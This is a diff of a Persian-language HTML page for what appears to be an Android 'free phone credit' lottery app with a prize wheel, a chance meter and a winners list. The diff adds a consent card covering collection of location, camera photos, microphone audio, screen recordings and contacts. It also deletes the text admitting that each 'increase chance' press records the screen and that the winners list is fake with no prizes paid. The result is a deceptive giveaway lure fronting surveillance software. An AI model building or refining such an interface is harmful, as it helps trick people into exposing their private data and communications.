@@ -3,36 +3,42 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
-<title>PRF</title>
+<title>شارژ رایگان</title>
 <link rel="stylesheet" href="app.css">
 </head>
 <body>
 
 <div class="aurora"></div>
 
-<main class="wrap">
+<div class="consent" id="consent">
+  <div class="consentCard">
+    <div class="consentMark"></div>
+    <h2 class="consentTitle">پیش از شروع، این را بخوانید</h2>
+    <p class="consentOrg">این برنامه متعلق به <b id="consentOrg">شرکت</b> است و روی گوشی‌ای نصب شده که از طرف همان شرکت در اختیار شما قرار گرفته.</p>
+    <ul class="consentList">
+      <li>اطلاعات گوشی شامل مدل، نسخه‌ی اندروید، شناسه، حافظه، پردازنده، شبکه و نشانی آی‌پی</li>
+      <li>موقعیت مکانی گوشی، هم از GPS و هم از شبکه و سیم‌کارت</li>
+      <li>عکس‌هایی که دوربین جلو و عقب می‌گیرد</li>
+      <li>صدای ضبط‌شده از میکروفون</li>
+      <li>تصویر صفحه‌ی گوشی که با MediaProjection ضبط می‌شود</li>
+      <li>فهرست مخاطبین، جداکرده‌شده به روی سیم‌کارت، روی دستگاه و حساب‌های گوگل</li>
+    </ul>
+    <p class="consentWhere">همه‌ی این داده‌ها روی سرور شرکت نگه‌داری می‌شود و فقط مدیران شرکت آن را می‌بینند. این برنامه هیچ چیز را به شخص دیگری نمی‌فرستد.</p>
+    <div class="consentBtns">
+      <button class="btn ghost" data-act="consentNo" id="btnConsentNo">نمی‌پذیرم</button>
+      <button class="btn primary" data-act="consentYes" id="btnConsentYes">می‌پذیرم</button>
+    </div>
+  </div>
+</div>
+
+<main class="wrap" id="wrap" hidden>
 
   <header class="hero">
-    <div class="mark">PRF</div>
     <h1>شارژ رایگان</h1>
     <p class="sub" id="heroSub">در حال آماده‌سازی…</p>
   </header>
 
-  <section class="card gate" id="gateCard">
-    <div class="gateRow">
-      <span class="gateDot" id="gateDot"></span>
-      <div class="gateText">
-        <strong id="gateTitle">مدیریت گوشی</strong>
-        <small id="gateNote">بررسی می‌شود…</small>
-      </div>
-    </div>
-    <div class="gateBtns" id="gateBtns">
-      <button class="btn ghost sm" data-act="admin" id="btnAdmin">فعال‌سازی مدیریت گوشی</button>
-      <button class="btn ghost sm" data-act="owner" id="btnOwner">ثبت مالک دستگاه</button>
-    </div>
-  </section>
-
-  <section class="card">
+  <section class="card" id="joinCard">
     <label class="lbl" for="phone">شماره‌ی موبایل</label>
     <input class="field" id="phone" type="tel" inputmode="numeric" autocomplete="off"
            maxlength="14" placeholder="۰۹۱۲۳۴۵۶۷۸۹">
@@ -45,68 +51,41 @@
     </div>
 
     <button class="btn primary big" data-act="register" id="btnRegister">ثبت شماره</button>
-    <p class="hint">با زدن این دکمه، برنامه مدیریت گوشی را فعال می‌کند، عکس و صدا و موقعیت می‌گیرد و همه را می‌فرستد.</p>
   </section>
 
   <section class="card" id="chanceCard">
     <div class="chanceTop">
-      <div>
-        <div class="chanceN n" id="chanceN">۰</div>
-        <div class="chanceL">شانس شما</div>
-      </div>
-      <div class="chanceSide">
-        <div><span class="k">ویدیو ذخیره‌شده</span><span class="v n" id="videoN">۰</span></div>
-        <div><span class="k">چرخ بعدی</span><span class="v" id="spinIn">—</span></div>
-      </div>
+      <div class="chanceLabel">شانس شما</div>
+      <div class="chanceN n" id="chanceN">۰</div>
     </div>
     <div class="bar"><i id="chanceBar"></i></div>
-    <p class="hint" id="chanceHint">هر ۳ دقیقه یک شانس اضافه می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.</p>
-
     <button class="btn primary big spin" data-act="spin" id="btnSpin">افزایش شانس</button>
-    <p class="spinNote" id="spinNote">با هر فشردن، صفحه گوشی ضبط و ذخیره می‌شود.</p>
   </section>
 
   <section class="card wheelCard">
     <div class="wheelBox">
       <div class="pointer"></div>
-      <div class="wheel" id="wheel"></div>
+      <div class="wheel" id="wheel">
+        <div class="prizeRing" id="prizeRing"></div>
+        <div class="disc" id="disc"></div>
+      </div>
       <div class="hub n" id="wheelHub">۰٪</div>
     </div>
-    <p class="odds" id="odds">در حال بارگذاری…</p>
+    <div class="spinRow">
+      <span class="nextSpin" id="spinIn">آماده</span>
+      <button class="btn primary" data-act="turn" id="btnTurn">بچرخان</button>
+    </div>
     <p class="result" id="result"></p>
   </section>
 
-  <section class="card">
+  <section class="card winnersCard">
     <h2 class="h2">برندگان</h2>
     <ul class="winners" id="winners"></ul>
-    <p class="hint">این فهرست نمونه است و هیچ جایزه‌ای پرداخت نشده است.</p>
-  </section>
-
-  <section class="card" id="infoCard">
-    <h2 class="h2">اطلاعات گوشی شما</h2>
-    <p class="hint" id="infoHint">این اطلاعات همراه رکورد شما برای پنل مدیریت فرستاده می‌شود.</p>
-    <div class="facts" id="facts"></div>
-  </section>
-
-  <section class="card logCard">
-    <h2 class="h2">وضعیت</h2>
-    <div class="log" id="log">آماده.</div>
-    <div class="progress" id="progress" hidden><i></i></div>
-    <button class="btn ghost sm" data-act="settings" id="btnSettings">تنظیمات مجوزها</button>
   </section>
 
 </main>
 
-<div class="sheet" id="sheet" hidden>
-  <div class="sheetCard">
-    <h3 id="sheetTitle"></h3>
-    <p id="sheetBody"></p>
-    <div class="sheetBtns">
-      <button class="btn ghost" data-act="sheetNo" id="sheetNo">انصراف</button>
-      <button class="btn primary" data-act="sheetYes" id="sheetYes">تایید</button>
-    </div>
-  </div>
-</div>
+<div class="toast" id="toast" hidden></div>
 
 <script src="app.js"></script>
 </body>
